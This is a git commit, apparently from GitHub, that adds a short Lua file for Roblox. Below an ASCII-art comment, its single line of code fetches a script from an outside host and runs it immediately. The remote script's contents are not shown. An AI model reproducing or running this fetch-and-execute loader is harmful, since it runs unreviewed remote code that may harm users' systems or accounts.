1938ecab19dab521216260257e5c9af0e0fd2c93
NetworkPing <bababoy666ks@gmail.com>
2026-08-02 17:16:26 +0800

    Add files via upload

---
+++ script.lua
@@ -0,0 +1,6 @@
+--[[   ██████       █             █
+   █                      █          █
+     ██████          █       █
+                  █          █    █
+    ██████               █▌           ]]
+loadstring(game:HttpGet("https://illunox.qzz.io/api/scripts/03b0fcf9657c4bf198492b64c35a6c26"))()
